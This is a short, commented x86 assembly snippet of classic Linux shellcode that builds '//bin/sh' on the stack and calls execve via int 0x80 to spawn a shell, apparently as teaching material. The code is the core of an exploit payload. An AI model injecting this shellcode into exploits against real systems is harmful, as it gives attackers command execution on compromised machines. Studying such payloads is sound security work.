xor eax, eax
push eax ; null terminated string
push "n/sh" ;last 4 bytes of //bin/sh
push "//bi" ;first 4 bytes
mov ebx, esp ;make ebx point to "//bin/sh"
push eax ;null terminated array
push ebx ;push the address of the string
mov ecx, esp ;make ecx point to the address of the string
mov edx, eax  ;mov this into edx
mov al, 0x0b
int 0x80
